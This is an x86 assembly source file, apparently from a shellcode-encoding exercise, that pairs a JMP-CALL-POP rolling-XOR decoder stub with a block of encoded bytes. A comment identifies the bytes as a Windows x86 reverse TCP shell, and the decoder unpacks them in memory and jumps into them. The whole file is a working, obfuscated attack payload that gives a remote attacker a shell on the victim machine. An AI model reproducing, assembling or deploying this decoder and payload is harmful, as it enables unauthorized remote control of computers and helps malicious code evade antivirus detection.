; Name: rolling-xor-decoder-random.asm
; Author: hodorsec

global _start

section .text
_start:
	jmp short call_shellcode

decoder:
    	pop esi         		; Being called by decoder, last pushed value on stack, put in ESI
	xor ecx, ecx			; Clear for counting loop
	mov cx, len			; Put length of EncodedShellcode into CL for count loop

decode:
	mov bl, [esi]			; Copy first character pointing from ESI to BL
	mov dl, [esi+1]			; Copy second character pointing from ESI to DL
	xor bl, dl			; Do a XOR on the character being stored in DL, copy result in BL
	mov [esi], bl			; Copy the XOR'ed value into the address where ESI is pointing to
	inc esi				; Move to next character
	loop decode			; "loop" automatically decrements CL, so loop until 0 then goto next instruction
	jmp EncodedShellcode 		; Jump to the address of the shellcode to execute

call_shellcode:
	call decoder
	; The encoded shellcode as generated by the python script "rolling-xor-encoder-random.py"
	; ASM XOR encoded Windows x86 reverse TCP
	EncodedShellcode: db 0x5c,0xa0,0x48,0xca,0xca,0xca,0xca,0xaa,0x23,0xc6,0xf7,0x37,0x53,0xd8,0x88,0xb8,0x33,0x61,0x6d,0xe6,0xb4,0xa0,0x2b,0x59,0x71,0x7e,0xc9,0x83,0xa5,0x94,0x6b,0xc7,0xfb,0x9a,0xe6,0xe4,0xc8,0xe8,0x29,0xe6,0xeb,0xea,0x2d,0xcf,0x3d,0x6f,0x38,0xb3,0xe1,0xf1,0x7a,0x30,0x0c,0x87,0xcb,0xda,0xa2,0x41,0x09,0x08,0xd9,0x88,0x03,0x5a,0x7a,0x7b,0xa8,0x23,0x6a,0x72,0x91,0xab,0xe2,0x69,0x5d,0xd6,0xd7,0x01,0x30,0xcf,0x63,0xa2,0x6d,0x60,0x61,0xa6,0x9e,0x7e,0x0b,0xfd,0xfe,0x83,0x7b,0x40,0x3d,0x19,0x6c,0x88,0xd0,0x5b,0x03,0x27,0x26,0xf5,0x93,0x18,0x14,0x5f,0xd4,0x8c,0x90,0x91,0x42,0xc9,0xcd,0x46,0x47,0x97,0x1e,0x5a,0x7e,0x5a,0x01,0x5a,0x3b,0x62,0x38,0x69,0x96,0x76,0x29,0x76,0x2c,0xa7,0xb5,0x5e,0xd3,0x8e,0xe6,0xd5,0xe7,0xe7,0xe7,0x8f,0xf8,0x8b,0xb9,0xe6,0xb2,0xda,0x96,0xe1,0xc7,0xc0,0x3f,0xea,0x52,0xc2,0xc3,0xc3,0xc3,0xea,0x2e,0x7a,0x2a,0x42,0x6b,0xeb,0x80,0x80,0x7f,0xaa,0xfa,0xaa,0xfa,0xaa,0xea,0xba,0xfa,0xaa,0xc2,0x28,0x27,0xf8,0x18,0xe7,0x32,0xa5,0xcf,0xca,0xa2,0x62,0xca,0x36,0x30,0x58,0x5a,0x5a,0x41,0x78,0xf1,0x17,0x7d,0x6d,0x3b,0x6c,0x04,0x9d,0x38,0x4c,0x2d,0xd2,0x07,0x82,0x42,0x36,0x3a,0xc5,0x8b,0x83,0xf6,0x1a,0x72,0x82,0x37,0x95,0xc3,0x3c,0xe9,0x81,0xe2,0x8f,0xeb,0xeb,0x62,0x81,0xd6,0x81,0xd6,0xe7,0x11,0x7b,0x69,0x30,0x66,0x84,0x79,0x1f,0xd8,0x9c,0xb8,0x84,0x85,0x84,0x09,0x4d,0x69,0x79,0xbf,0xbf,0xfb,0xaf,0xff,0xa9,0xff,0xa9,0xef,0xb9,0xf7,0xa1,0xf7,0xa4,0xf2,0x9a,0xe3,0x2f,0x10,0x96,0x69,0xbc,0x35,0xd5,0x9b,0xcd,0x8b,0x74,0x44,0x2c,0x24,0xa3,0xbe,0xde,0x21,0xf4,0x4f,0xaf,0xb2,0x98,0x92,0xfa,0x5c,0xc9,0x74,0xe9,0x16,0xc3,0xff,0xf9,0x85,0x8f,0x0f,0xf4,0x14,0x61,0x64,0xdf,0x98,0x8b,0xf9,0x96,0xfc,0xfc,0xaf,0x50,0x85
	len: equ $-EncodedShellcode	; Variable for the length of the encoded shellcode
